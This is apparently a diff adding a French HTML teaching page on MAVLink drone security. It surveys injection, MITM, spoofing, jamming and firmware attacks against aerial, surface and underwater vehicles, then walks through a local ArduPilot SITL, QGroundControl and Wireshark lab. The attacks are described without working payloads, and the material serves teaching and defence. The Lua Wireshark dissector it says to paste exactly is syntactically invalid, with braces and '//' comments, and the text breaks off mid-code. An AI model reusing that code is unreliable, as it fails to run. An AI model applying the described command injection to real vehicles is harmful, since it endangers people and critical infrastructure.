+      Architecture minimaliste et priorité donnée à la performance au détriment de la sécurité → protocole hautement vulnérable aux attaques réseau. Le CRC contrôle seulement les erreurs de transmission, pas les altérations malveillantes.
+    </div>
+
+    <h4 class="sub2">MAVLink 1 vs MAVLink 2</h4>
+    <div class="compare-grid">
+      <div class="compare-cell v1">
+        <div class="c-label">● MAVLink v1 — Legacy</div>
+        <ul>
+          <li>Format de message simple</li>
+          <li>Message sets limités et peu extensibles</li>
+          <li>Aucune sécurité des données</li>
+          <li>Débit de base</li>
+          <li>Identifiant 8-bit (0xFE)</li>
+          <li>Pas de signature de message</li>
+          <li>Commandes limitées</li>
+        </ul>
+      </div>
+      <div class="compare-cell v2">
+        <div class="c-label">● MAVLink v2 — Modern</div>
+        <ul>
+          <li>Format complexe et extensible</li>
+          <li>Message sets vastes et flexibles</li>
+          <li>Signature cryptographique intégrée</li>
+          <li>Débit amélioré, payload compact</li>
+          <li>Identifiant 8-bit (0xFD) + ID 24-bit</li>
+          <li>Authentification de source</li>
+          <li>Support multi-systèmes distribués</li>
+        </ul>
+      </div>
+    </div>
+
+    <h3 class="subsection">Vulnérabilités du Protocole MAVLink</h3>
+
+    <div class="vuln-card">
+      <div class="vuln-title">1 — Conception Non Sécurisée</div>
+      <p class="prose">Aucun mécanisme de chiffrement ni d'authentification n'a été intégré lors de la conception initiale pour maximiser la rapidité et éviter la surcharge processeur.</p>
+      <ul class="styled">
+        <li>Messages non chiffrés : GPS, altitude, commandes circulent en clair</li>
+        <li>Absence d'authentification : un message falsifié n'est pas distingué d'un légitime</li>
+        <li>Manque d'intégrité forte : CRC insuffisant face aux altérations malveillantes</li>
+      </ul>
+    </div>
+
+    <div class="vuln-card">
+      <div class="vuln-title">2 — Sniffing & Man-in-the-Middle (MITM)</div>
+      <p class="prose">La structure non chiffrée permet une attaque MITM par ARP poisoning, où l'adversaire s'intercale entre le drone et la station sol.</p>
+      <ul class="styled">
+        <li>Sniffing du trafic : position GPS, vitesse, cap des moteurs, statut de mission</li>
+        <li>Altération ou retardement des messages</li>
+        <li>Identification des trames critiques : HEARTBEAT, MISSION_COUNT, GLOBAL_POSITION_INT</li>
+      </ul>
+    </div>
+
+    <div class="vuln-card">
+      <div class="vuln-title">3 — Flooding (Déni de Service)</div>
+      <p class="prose">Envoi massif de paquets ICMP qui saturent la bande passante ou le processeur du drone.</p>
+      <ul class="styled">
+        <li>Perte de communication GCS ↔ UAV</li>
+        <li>Arrêt automatique de la mission (fail-safe hit)</li>
+      </ul>
+    </div>
+
+    <div class="vuln-card">
+      <div class="vuln-title">4 — Injection de Paquets MAVLink</div>
+      <p class="prose">Un attaquant peut réinjecter un faux MISSION_COUNT pendant le vol après avoir intercepté les trames.</p>
+      <ul class="styled">
+        <li>Le drone supprime sa mission en cours → hovering indéfini</li>
+        <li>Injection d'une nouvelle mission factice → détournement du vol</li>
+        <li>Impact critique : arrêt immédiat de la mission sans crash</li>
+      </ul>
+    </div>
+
+    <h3 class="subsection">Limites de MAVLink 2</h3>
+    <div class="alert alert-danger">
+      <strong>Limites Importantes</strong>
+      La signature de MAVLink 2 ne chiffre pas le contenu des messages. Un attaquant peut toujours observer, lire la télémétrie, analyser les ordres transmis et cartographier les échanges. La confidentialité des données n'est pas assurée par la seule signature.
+    </div>
+    <ul class="styled">
+      <li>Pas de chiffrement complet — la signature n'assure que l'authenticité et l'intégrité</li>
+      <li>Si la signature n'est pas activée ou si les clés sont mal protégées, le gain est très limité</li>
+      <li>Un attaquant peut encore analyser la fréquence des messages et collecter des informations sensibles</li>
+    </ul>
+
+    <h3 class="subsection">Tableau des Messages MAVLink</h3>
+    <div style="overflow-x:auto; margin: 20px 0;">
+      <table class="data-table">
+        <thead>
+        
+          <tr>
+            <th>Capteur</th>
+            <th>Message MAVLink</th>
+            <th>Ce que ça donne</th>
+            <th>Utilisation</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td>GPS</td><td><span class="sensor-badge">GPS_RAW_INT</span></td><td>Latitude, longitude, vitesse, satellites</td><td>Navigation, position</td></tr>
+          <tr><td>Position globale</td><td><span class="sensor-badge">GLOBAL_POSITION_INT</span></td><td>Position + altitude + vitesse</td><td>Suivi du drone</td></tr>
+          <tr><td>Orientation</td><td><span class="sensor-badge">ATTITUDE</span></td><td>Roll, pitch, yaw</td><td>Stabilisation</td></tr>
+          <tr><td>IMU (brut)</td><td><span class="sensor-badge">RAW_IMU</span></td><td>Accélération + gyro</td><td>Contrôle bas niveau</td></tr>
+          <tr><td>IMU filtrée</td><td><span class="sensor-badge">SCALED_IMU2</span></td><td>Données IMU plus propres</td><td>Algorithmes</td></tr>
+          <tr><td>Altitude baro</td><td><span class="sensor-badge">SCALED_PRESSURE</span></td><td>Pression + altitude estimée</td><td>Altitude</td></tr>
+          <tr><td>Vitesse / HUD</td><td><span class="sensor-badge">VFR_HUD</span></td><td>Altitude, vitesse, throttle</td><td>Monitoring vol</td></tr>
+          <tr><td>Batterie</td><td><span class="sensor-badge">SYS_STATUS</span></td><td>Voltage, courant, batterie %</td><td>Sécurité</td></tr>
+          <tr><td>Heartbeat</td><td><span class="sensor-badge">HEARTBEAT</span></td><td>État système, mode</td><td>Communication</td></tr>
+          <tr><td>Mission</td><td><span class="sensor-badge">MISSION_CURRENT</span></td><td>Waypoint actuel</td><td>Suivi mission</td></tr>
+          <tr><td>Vitesse locale</td><td><span class="sensor-badge">LOCAL_POSITION_NED</span></td><td>Position X,Y,Z locale</td><td>Contrôle avancé</td></tr>
+          <tr><td>Obstacles</td><td><span class="sensor-badge">DISTANCE_SENSOR</span></td><td>Distance obstacles</td><td>Évitement</td></tr>
+          <tr><td>Caméra</td><td><span class="sensor-badge">CAMERA_FEEDBACK</span></td><td>Infos capture image</td><td>Vision</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ── PARTIE 2 : USV ── -->
+  <div class="part-banner">
+    <div class="part-num">02</div>
+    <div class="part-info">
+      <div class="part-label">Partie 2</div>
+      <div class="part-name">Drone de Surface — USV (Unmanned Surface Vehicle)</div>
+    </div>
+  </div>
+
+  <div class="content-area">
+
+    <h3 class="subsection">Qu'est-ce qu'un USV ?</h3>
+    <p class="prose">Les USV (Unmanned Surface Vehicles) sont des véhicules de surface sans pilote opérant à la surface des milieux aquatiques (mers, océans, lacs). Ils peuvent être entièrement autonomes ou téléopérés à distance, réduisant les risques humains et permettant des missions prolongées en environnements hostiles.</p>
+
+    <div class="cards-grid"  style="grid-template-columns: repeat(auto-fill, minmax(230px,1fr))">
+      <div class="card">
+        <div class="card-title">Surveillance Maritime</div>
+        <div class="card-body">Contrôle des frontières, lutte contre la piraterie, surveillance des zones économiques exclusives.</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Recherche & Sauvetage</div>
+        <div class="card-body">Assistance lors d'accidents en mer, détection de survivants, support aux équipes humaines (SAR).</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Cartographie Océanographique</div>
+        <div class="card-body">Collecte de données bathymétriques, analyse des fonds marins et suivi environnemental.</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Applications Militaires</div>
+        <div class="card-body">Reconnaissance, déminage naval, missions de renseignement et opérations de sécurité.</div>
+      </div>
+    </div>
+
+    <h3 class="subsection">Contraintes Physiques du Milieu Maritime</h3>
+    <div class="two-col">
+      <div class="info-box">
+        <div class="ib-title">Atténuation Signal RF</div>
+        <ul class="styled">
+          <li>Humidité et embruns : absorption des signaux RF haute fréquence</li>
+          <li>Conditions atmosphériques variables : réduction de portée de 40 à 70 %</li>
+          <li>Corrosion des antennes par l'environnement salin</li>
+          <li>Effet ducting : zones de propagation anormale</li>
+        </ul>
+      </div>
+      <div class="info-box">
+        <div class="ib-title">Multi-trajets & Infrastructure</div>
+        <ul class="styled">
+          <li>Surface de l'eau : excellent réflecteur d'ondes EM</li>
+          <li>Signaux arrivant par trajets multiples → interférences destructives</li>
+          <li>Dégradation du SNR, augmentation du BER, instabilité du lien MAVLink</li>
+          <li>Au-delà de 20-50 km des côtes : aucun réseau cellulaire disponible</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="alert alert-warn" style="margin-top:20px">
+      <strong>Environnement Hostile</strong>
+      Conditions météo instables (vents, vagues, tempêtes) · Courants marins imprévisibles · Forte humidité affectant les systèmes électroniques · Connectivité limitée ou intermittente
+    </div>
+
+    <h3 class="subsection">Vulnérabilités MAVLink dans le Contexte USV</h3>
+
+    <div class="vuln-card">
+      <div class="vuln-title">1 — Absence de Chiffrement</div>
+      <p class="prose">Un attaquant équipé d'un récepteur SDR peut intercepter passsivement toutes les données de télémétrie (position, cap, vitesse, état batterie), reconstituer le plan de mission complet et identifier les zones d'intérêt stratégiques.</p>
+      <div class="alert alert-danger" style="margin-top:12px">
+        <strong>Impact aggravé USV</strong>
+        Les missions USV couvrent souvent des zones militaires, des infrastructures critiques (pipelines, câbles sous-marins). La compromission peut avoir des conséquences géopolitiques et sécuritaires majeures.
+      </div>
+    </div>
+
+    <div class="vuln-card">
+      <div class="vuln-title">2 — Injection de Commandes & Spoofing</div>
+      <ul class="styled">
+        <li>SET_MODE → basculer en mode MANUAL et faire dériver l'USV</li>
+        <li>MISSION_ITEM frauduleux → dévier vers une zone dangereuse</li>
+        <li>DO_SET_HOME → redéfinir le point de retour base</li>
+        <li>MAV_CMD_DO_MOTOR_TEST → arrêter les moteurs en mer</li>
+      </ul>
+      <p class="prose" style="margin-top:10px">Contrairement à un UAV qui peut atterrir d'urgence, un USV sans moteur en mer devient incontrôlable, sujet aux courants et aux vents, avec risque de collision.</p>
+    </div>
+
+    <div class="vuln-card">
+      <div class="vuln-title">3 — MITM et Jamming</div>
+      <ul class="styled">
+        <li>MITM : Falsification de la télémétrie, modification des commandes, suppression des alertes</li>
+        <li>Jamming : l'USV entre en fail-safe, peut dériver des heures en haute mer</li>
+        <li>Jamming ciblé lors d'une manœuvre critique (entrée dans un port) → risque de collision</li>
+        <li>Équipements de jamming portables et peu coûteux : vecteur d'attaque accessible</li>
+      </ul>
+    </div>
+
+    <div class="cards-grid">
+      <div class="card">
+        <div class="card-title" style="color:#f08080">Récupération Difficile</div>
+        <div class="card-body">Un USV compromis en haute mer est souvent irrécupérable. L'envoi d'une équipe nécessite un navire, du temps et des conditions favorables.</div>
+      </div>
+      <div class="card">
+        <div class="card-title" style="color:#f08080">Isolement Total</div>
+        <div class="card-body">Aucune intervention humaine directe possible en temps réel. La réponse doit être entièrement automatisée → mécanismes embarqués robustes.</div>
+      </div>
+      <div class="card">
+        <div class="card-title" style="color:#f08080">Dépendance Critique</div>
+        <div class="card-body">Un USV sans lien de communication peut devenir un danger actif pour la navigation maritime et engager la responsabilité légale de l'opérateur.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── PARTIE 3 : UUV ── -->
+  <div class="part-banner">
+    <div class="part-num">03</div>
+    <div class="part-info">
+      <div class="part-label">Partie 3</div>
+      <div class="part-name">Véhicule Sous-Marin — UUV (Unmanned Underwater Vehicle)</div>
+    </div>
+  </div>
+
+  <div class="content-area">
+
+    <h3 class="subsection">Définition & Types</h3>
+    <p class="prose">Les UUV constituent la catégorie de véhicules autonomes la plus complexe sur le plan des communications. Contrairement aux UAV et USV bénéficiant de liaisons radio directes, les UUV opèrent dans un milieu où les ondes électromagnétiques sont quasi-inexistantes au-delà de quelques mètres. Ils ne peuvent pas utiliser MAVLink directement sur un lien radio en temps réel lorsqu'ils sont immergés.</p>
+
+    <div style="overflow-x:auto; margin:20px 0">
+      <table class="data-table">
+        <thead>
+          <tr><th>Type</th><th>Acronyme</th><th>Mode</th><th>Caractéristiques</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Autonomous Underwater Vehicle</td><td><span class="sensor-badge">AUV</span></td><td>Autonome</td><td>Mission pré-programmée, pas de lien temps réel, retour base pour récupération des données</td></tr>
+          <tr><td>Remotely Operated Vehicle</td><td><span class="sensor-badge">ROV</span></td><td>Téléopéré</td><td>Cordon ombilical filaire (tether), contrôle temps réel, inspection offshore</td></tr>
+          <tr><td>Hybrid AUV/ROV</td><td><span class="sensor-badge">HAUV</span></td><td>Hybride</td><td>Peut opérer en mode AUV ou commuter en mode ROV selon la mission</td></tr>
+          <tr><td>Micro/Nano AUV</td><td><span class="sensor-badge">MAUV</span></td><td>Autonome léger</td><td>Petite taille, mission courte, essaim, inspection d'infrastructures sous-marines</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3 class="subsection">Technologies de Communication Sous-Marines</h3>
+    <div class="cards-grid">
+      <div class="card">
+        <div class="card-title">Communication Acoustique</div>
+        <div class="card-body">La plus utilisée. Portée plusieurs km. Débit faible, latence élevée (vitesse du son ≈ 1500 m/s). Sensible au bruit ambiant, température, salinité et multi-trajets.</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Communication Optique</div>
+        <div class="card-body">Spectre bleu-vert. Très haut débit (Mbps), faible latence, portée limitée (quelques dizaines de mètres). Nécessite ligne de vue directe. Sensible à la turbidité.</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Communication RF</div>
+        <div class="card-body">Très limité sous l'eau (quelques cm à quelques mètres). Utilisé uniquement en surface ou très faible profondeur. Haut débit mais forte atténuation dans l'eau salée.</div>
+      </div>
+    </div>
+
+    <h3 class="subsection">Protocoles de Communication UUV</h3>
+    <div class="two-col">
+      <div class="info-box">
+        <div class="ib-title">Protocoles Internes</div>
+        <ul class="styled">
+          <li><strong>UART</strong> : simple et léger, capteurs ↔ processeur</li>
+          <li><strong>I2C</strong> : communication courte distance, capteurs multiples</li>
+          <li><strong>SPI</strong> : rapide, capteurs haut débit</li>
+          <li><strong>CAN</strong> : robuste, tolérant aux erreurs, systèmes critiques</li>
+        </ul>
+      </div>
+      <div class="info-box">
+        <div class="ib-title">Protocoles Acoustiques</div>
+        <ul class="styled">
+          <li><strong>JANUS</strong> : standard OTAN pour communication sous-marine, interopérabilité</li>
+          <li><strong>WHOI Micro-Modem</strong> : utilisé dans les modems acoustiques, adapté aux faibles débits</li>
+          <li><strong>ROS</strong> : architecture logicielle robotique, facilite la communication inter-modules</li>
+          <li><strong>DDS</strong> : communication temps réel, systèmes distribués</li>
+        </ul>
+      </div>
+    </div>
+
+    <h3 class="subsection">Utilisation de MAVLink dans les UUV</h3>
+    <div class="cards-grid" style="grid-template-columns: repeat(auto-fill, minmax(230px,1fr))">
+      <div class="card">
+        <div class="card-title">ROV (tether)</div>
+        <div class="card-body">MAVLink utilisé en temps réel grâce au câble. Envoi de commandes joystick, réception position/orientation. Risque : accès physique au câble → interception ou injection MITM.</div>
+      </div>
+      <div class="card">
+        <div class="card-title">AUV — Avant Mission</div>
+        <div class="card-body">Définir waypoints, régler paramètres, vérifier capteurs. Une fois lancé, le robot suit le plan seul. Risque : modification pré-départ → trajectoire erronée non détectable.</div>
+      </div>
+      <div class="card">
+        <div class="card-title">AUV — Après Mission</div>
+        <div class="card-body">Téléchargement des logs, analyse de trajectoire, détection d'anomalies. Risque : données sensibles (zones explorées, informations collectées).</div>
+      </div>
+      <div class="card">
+        <div class="card-title">MAVLink Acoustique</div>
+        <div class="card-body">Adapté pour envoyer des informations importantes (position, état). Débit très faible, délai important. Risque : données fragmentées → erreurs ou attaques, difficile à sécuriser.</div>
+      </div>
+    </div>
+
+    <h3 class="subsection">Vulnérabilités des UUV (Unmanned Underwater Vehicles)</h3>
+
+  <div class="vuln-card">
+    <div class="vuln-title">1 — Injection MAVLink en phase pré-mission</div>
+    <p class="prose">
+      Avant le déploiement, un attaquant ayant accès au réseau (Wi-Fi, Ethernet) peut injecter des commandes malveillantes.
+      Une fois immergé, l’UUV ne peut plus être reconfiguré.
+    </p>
+    <ul class="styled">
+      <li>Modification des waypoints → redirection vers zone interdite</li>
+      <li>Ajout de DO_JUMP → boucle infinie → épuisement batterie</li>
+      <li>Modification de WPNAV_SPEED → consommation excessive</li>
+      <li>Falsification du point de retour (DO_SET_HOME)</li>
+      <li>Désactivation du géofencing</li>
+    </ul>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-title">2 — Exfiltration de données (MAVFTP)</div>
+    <p class="prose">
+      Le protocole MAVFTP permet le transfert de fichiers sans authentification forte.
+    </p>
+    <ul class="styled">
+      <li>Trajectoires GPS précises</li>
+      <li>Données sonar et images</li>
+      <li>Données CTD (température, salinité, pression)</li>
+      <li>Logs capteurs → capacités techniques</li>
+      <li>Paramètres système et réseau</li>
+    </ul>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-title">3 — Compromission du firmware</div>
+    <p class="prose">
+      L’absence de signature cryptographique permet l’installation d’un firmware malveillant.
+    </p>
+    <ul class="styled">
+      <li>Espionnage des données capteurs</li>
+      <li>Déclenchement d’actions à distance</li>
+      <li>Désactivation des protections de sécurité</li>
+      <li>Backdoor de contrôle</li>
+    </ul>
+  </div>
+
+  <h3 class="subsection">Vulnérabilités des Communications Acoustiques</h3>
+
+  <div class="vuln-card">
+    <div class="vuln-title">4 — Acoustic Spoofing (USBL/LBL)</div>
+    <p class="prose">
+      Un attaquant peut émettre de faux signaux acoustiques et falsifier les temps de propagation,
+      induisant une erreur de position de l’UUV.
+    </p>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-title">5 — DVL Spoofing (Falsification de Vitesse)</div>
+    <p class="prose">
+      Simulation d’un faux fond marin pour injecter une vitesse erronée →
+      dérive cumulative de la navigation inertielle.
+    </p>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-title">6 — Acoustic Denial of Service (ADoS)</div>
+    <ul class="styled">
+      <li>Brouillage acoustique haute puissance</li>
+      <li>Interférence avec le DVL</li>
+      <li>Ping flooding → saturation du canal</li>
+      <li>Désorganisation d’un essaim d’UUV</li>
+    </ul>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-title">7 — Replay Attack Acoustique</div>
+    <p class="prose">
+      Sans mécanisme anti-rejeu, un attaquant peut enregistrer et rejouer des commandes critiques
+      (remontée, arrêt moteur, mission).
+    </p>
+  </div>
+
+  <h3 class="subsection">Vulnérabilités du Tether (ROV)</h3>
+
+  <div class="vuln-card">
+    <div class="vuln-title">8 — Accès physique au tether</div>
+    <ul class="styled">
+      <li>Interception du trafic (MAVLink, vidéo)</li>
+      <li>Injection de commandes</li>
+      <li>Coupure du lien ROV-surface</li>
+    </ul>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-title">9 — Attaque MITM sur le réseau</div>
+    <ul class="styled">
+      <li>ARP spoofing sur le réseau Ethernet</li>
+      <li>Modification des commandes joystick</li>
+      <li>Falsification des données de télémétrie</li>
+      <li>Injection de commandes ARM/DISARM</li>
+    </ul>
+  </div>
+</div>
+</div><!-- end théorie -->
+
+<!-- ═══════════════════════════════════════════════════════════
+     PARTIE SIMULATION
+═══════════════════════════════════════════════════════════ -->
+<div id="simulation" class="section">
+
+  <div class="section-header">
+    <div class="section-eyebrow">Partie Pratique</div>
+    <h2 class="section-title">Simulation & Analyse du Système UAV</h2>
+  </div>
+
+  <div class="content-area" style="padding-top:0">
+
+    <div class="alert alert-warn">
+      <strong>⚠ Prérequis Système</strong>
+      Version Ubuntu recommandée : <strong>Ubuntu 22.04 LTS</strong> · ArduPilot récent nécessite <strong>Python ≥ 3.9</strong>
+    </div>
+
+    <h3 class="subsection">Architecture du Système Simulé</h3>
+    <div class="cards-grid" style="grid-template-columns: repeat(auto-fill, minmax(230px,1fr))">
+      <div class="card">
+        <div class="card-title">1 — SITL</div>
+        <div class="card-body">Software In The Loop : simule le comportement complet du drone sur ordinateur. Simulation du vol, des capteurs, et exécution du firmware réel.</div>
+      </div>
+      <div class="card">
+        <div class="card-title">2 — GCS (2 stations)</div>
+        <div class="card-body">Station de contrôle au sol : surveille l'état, visualise la trajectoire, envoie des commandes via MAVLink.</div>
+      </div>
+      <div class="card">
+        <div class="card-title">3 — Télémétrie</div>
+        <div class="card-body">Échange de données GPS, vitesse, altitude, état système via le protocole MAVLink (UDP port 14550).</div>
+      </div>
+      <div class="card">
+        <div class="card-title">4 — Capteurs Simulés</div>
+        <div class="card-body">GPS → position · IMU → orientation (ATTITUDE) · Capteurs vitesse et altitude.</div>
+      </div>
+    </div>
+
+    <!-- ÉTAPE 1 : ArduPilot -->
+    <h3 class="subsection" style="margin-top:48px">Étape 1 — Installation d'ArduPilot SITL</h3>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Terminal — Installation ArduPilot
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-comment"># 1. Prérequis système</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt update && sudo apt upgrade</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt install git python3 python3-pip python3-dev build-essential wget curl</span></div>
+        <br>
+        <div><span class="t-comment"># 2. Cloner le dépôt ArduPilot</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">git clone https://github.com/ArduPilot/ardupilot.git</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">cd ardupilot</span></div>
+        <br>
+        <div><span class="t-comment"># 3. Installer les dépendances</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">Tools/environment_install/install-prereqs-ubuntu.sh -y</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">. ~/.profile</span></div>
+        <br>
+        <div><span class="t-comment"># 4. Compiler le simulateur SITL</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">./waf configure --board sitl</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">./waf copter</span></div>
+        <br>
+        <div><span class="t-comment"># 5. Lancer la simulation</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">cd ~/ardupilot/ArduCopter</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">../Tools/autotest/sim_vehicle.py -v ArduCopter -f quad --console --map</span></div>
+      </div>
+    </div>
+
+    <img src="images/img1.png" alt="Acoustic spoofing diagram" class="img">
+
+    <!-- ÉTAPE 2 : QGroundControl -->
+    <h3 class="subsection">Étape 2 — Installation de QGroundControl</h3>
+    <p class="prose">QGroundControl est la station de contrôle au sol (GCS) pour drones, compatible avec MAVLink et SITL.</p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Terminal — QGroundControl via AppImage
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-comment"># Prérequis</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt update</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt upgrade -y</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt install curl wget software-properties-common -y</span></div>
+        <br>
+        <div><span class="t-comment"># Supprimer modem manager</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo usermod -a -G dialout $USER</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt-get remove modemmanager -y</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt install gstreamer1.0-plugins-bad gstreamer1.0-libav gstreamer1.0-gl -y</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt install libfuse2 -y</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt install libxcb-xinerama0 libxkbcommon-x11-0 libxcb-cursor-dev -y</span></div>
+        <br>
+        <div><span class="t-out">Télécharger AppImage depuis https://qgroundcontrol.com</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">cd Téléchargements</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">chmod +x ./QGroundControl-x86_64.AppImage</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">./QGroundControl-x86_64.AppImage</span></div>
+        <br>
+        <div><span class="t-comment"># Connexion SITL via UDP</span></div>
+        <div><span class="t-out">→ Connection Type: udpin</span></div>
+        <div><span class="t-out">→ IP:Port: 127.0.0.1:14550</span></div>
+      </div>
+    </div>
+    <img src="images/img2.png" alt="Acoustic spoofing diagram" class="img">
+
+    <!-- ÉTAPE 3 : Wireshark -->
+    <h3 class="subsection">Étape 3 — Capture MAVLink avec Wireshark</h3>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Terminal — Installation Wireshark
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt update && sudo apt install wireshark</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo usermod -aG wireshark $USER</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo wireshark</span></div>
+        <br>
+        <div><span class="t-comment"># Dans Wireshark :</span></div>
+        <div><span class="t-out">→ Interface : loopback (lo)</span></div>
+        <div><span class="t-out">→ Filtre    : udp.port == 14550</span></div>
+        <div><span class="t-out">→ 127.0.0.1 = localhost → simulation locale</span></div>
+      </div>
+    </div>
+
+    <div class="alert alert-warn" style="margin-top:20px">
+      Wireshark ne reconnaît pas MAVLink nativement ⇒ faire fonctionner un dissector MAVLink dans Wireshark.
+    </div>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Terminal — Dissector MAVLink
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-out">→ Source : https://mavlink.io/en/guide/wireshark.html</span></div>
+        <br>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">mkdir -p ~/.local/lib/wireshark/plugins</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">nano ~/.local/lib/wireshark/plugins/mavlink.lua</span></div>
+        <br>
+        <div><span class="t-out">→ copie-colle exactement ceci :</span></div>
+        <div class="code-block">
+local mavlink = Proto("mavlink", "MAVLink Protocol")<br><br>
+
+local f_magic = ProtoField.uint8("mavlink.magic", "Magic")<br>
+local f_len   = ProtoField.uint8("mavlink.len", "Length")<br>
+local f_seq   = ProtoField.uint8("mavlink.seq", "Sequence")<br>
+local f_sysid = ProtoField.uint8("mavlink.sysid", "System ID")<br>
+local f_compid= ProtoField.uint8("mavlink.compid", "Component ID")<br>
+local f_msgid = ProtoField.uint8("mavlink.msgid", "Message ID")<br><br>
+
+mavlink.fields = {f_magic, f_len, f_seq, f_sysid, f_compid, f_msgid}<br><br>
+
+function mavlink.dissector(buffer, pinfo, tree) {<br>
+&nbsp;&nbsp;if buffer:len() &lt; 6 then return end<br><br>
+
+&nbsp;&nbsp;pinfo.cols.protocol = "MAVLink"<br><br>
+
+&nbsp;&nbsp;local subtree = tree:add(mavlink, buffer(), "MAVLink Packet")<br><br>
+
+&nbsp;&nbsp;subtree:add(f_magic, buffer(0,1))<br>
+&nbsp;&nbsp;subtree:add(f_len,   buffer(1,1))<br>
+&nbsp;&nbsp;subtree:add(f_seq,   buffer(2,1))<br>
+&nbsp;&nbsp;subtree:add(f_sysid, buffer(3,1))<br>
+&nbsp;&nbsp;subtree:add(f_compid,buffer(4,1))<br>
+&nbsp;&nbsp;subtree:add(f_msgid, buffer(5,1))<br>
+}<br><br>
+
+local udp_port = DissectorTable.get("udp.port")<br>
+udp_port:add(14550, mavlink) <span class="comment">// port MAVLink</span>
+</div>
+
+        <div><span class="t-prompt">$ </span><span class="t-cmd">wireshark &</span></div>
+    </div>
+  </div>
+<img src="images/img3.png" alt="Acoustic spoofing diagram" class="img">
+
+    <div class="alert alert-info" style="margin-top:12px">
+      <strong>Observation Clé — Pas de Chiffrement</strong>
+      Les messages MAVLink sont visibles en clair dans Wireshark : pas de chiffrement, pas d'authentification, accessibles via simple sniffing sur udp.port == 14550.
+    </div>
+
+    <!-- ÉTAPE 4 : MAVProxy -->
+    <h3 class="subsection">Étape 4 — MAVProxy : Analyse des Messages</h3>
+    <p class="prose">MAVProxy est un proxy MAVLink en ligne de commande permettant d'interagir directement avec le drone SITL.</p>
+
+    <h4 class="sub2">Analyse du HEARTBEAT</h4>
+    <p class="prose">Un heartbeat = un signal périodique (<strong>1 fois par seconde</strong>) : "Je suis actif, connecté, et voici mon état."</p>
+
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; MAVProxy
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">$ </span><span class="t-cmd">watch HEARTBEAT</span></div>
+      </div>
+    </div>
+
+    <img src="images/img4.png" alt="Acoustic spoofing diagram" class="img">
+
+    <div class="code-block">
+HEARTBEAT {<br>
+&nbsp; type              : &lt;type du système&gt;          <span class="comment">// 2 = UAV (drone), 6 = GCS</span><br>
+&nbsp; autopilot         : &lt;type d’autopilot&gt;        <span class="comment">// 3 = ArduPilot, 8 = aucun (GCS)</span><br>
+&nbsp; base_mode         : &lt;mode de base (bitmask)&gt; <span class="comment">// ex: 192 = armé + actif</span><br>
+&nbsp; custom_mode       : &lt;mode spécifique&gt;        <span class="comment">// dépend de l’autopilot (Stabilize, Auto…)</span><br>
+&nbsp; system_status     : &lt;état du système&gt;        <span class="comment">// 4 = actif, 3 = en attente</span><br>
